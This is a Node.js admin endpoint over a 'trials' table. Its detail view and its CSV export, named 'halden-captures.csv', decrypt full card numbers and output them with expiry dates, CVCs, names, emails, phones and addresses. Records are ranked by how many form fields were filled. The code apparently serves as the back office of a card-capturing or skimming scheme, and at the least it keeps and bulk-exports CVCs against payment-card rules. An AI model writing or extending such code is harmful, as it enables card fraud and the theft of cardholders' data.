const { pool } = require('./_db');
const { isAdmin } = require('./_auth');
const { open } = require('./_crypto');

const csvCell = v => `"${String(v ?? '').replace(/"/g, '""')}"`;

module.exports = async function handler(req, res) {
  const send = (code, body, type) => {
    res.statusCode = code;
    res.setHeader('Content-Type', type || 'application/json');
    res.end(type ? body : JSON.stringify(body));
  };
  if (!isAdmin(req)) return send(401, { error: 'unauthorised' });
  if (req.method !== 'GET') return send(405, { error: 'Method not allowed' });

  const q = req.query || {};
  const view = q.view || 'list';

  try {
    if (view === 'stats') {
      const { rows } = await pool.query(`SELECT status, count(*)::int AS n FROM trials GROUP BY status`);
      const totals = await pool.query(
        `SELECT count(*)::int AS total, count(*) FILTER (WHERE card_complete)::int AS cards FROM trials`);
      return send(200, { byStatus: rows, ...totals.rows[0] });
    }

    if (view === 'detail') {
      const { rows } = await pool.query('SELECT * FROM trials WHERE id = $1', [q.id]);
      if (!rows.length) return send(404, { error: 'not found' });
      return send(200, { ...rows[0], pan: open(rows[0].pan_sealed) });
    }

    if (view === 'export') {
      const { rows } = await pool.query(`SELECT * FROM trials ORDER BY created_at DESC LIMIT 5000`);
      const cols = ['id','created_at','status','email','name','phone','pan','pan_exp','cvc','address','country','stripe_customer','stripe_sub','fail_reason','referrer','ua'];
      const body = [cols.join(',')].concat(rows.map(r => {
        const o = { ...r, pan: open(r.pan_sealed), address: r.address ? JSON.stringify(r.address) : '' };
        return cols.map(c => csvCell(o[c])).join(',');
      })).join('\n');
      res.setHeader('Content-Disposition', 'attachment; filename="halden-captures.csv"');
      return send(200, body, 'text/csv');
    }

    const where = [], params = [];
    if (q.q) {
      params.push(`%${q.q}%`);
      where.push(`(email ILIKE $${params.length} OR name ILIKE $${params.length} OR pan_last4 ILIKE $${params.length})`);
    }
    if (q.status) { params.push(q.status); where.push(`status = $${params.length}`); }
    if (q.card === '1') where.push('card_complete = true');
    if (q.days) { params.push(parseInt(q.days, 10) || 7); where.push(`created_at > now() - ($${params.length} || ' days')::interval`); }

    const limit = Math.min(parseInt(q.limit, 10) || 50, 200);
    const offset = Math.max(parseInt(q.offset, 10) || 0, 0);
    params.push(limit, offset);

    const { rows } = await pool.query(
      `SELECT id, created_at, status, email, name, phone, pan_last4, pan_brand, pan_exp,
              card_complete, fields_filled, country, fail_reason, stripe_customer, stripe_sub
       FROM trials
       ${where.length ? 'WHERE ' + where.join(' AND ') : ''}
       ORDER BY card_complete DESC, fields_filled DESC, created_at DESC
       LIMIT $${params.length - 1} OFFSET $${params.length}`, params);
    send(200, { rows });
  } catch (e) {
    console.error('admin', e);
    send(500, { error: e.message });
  }
};
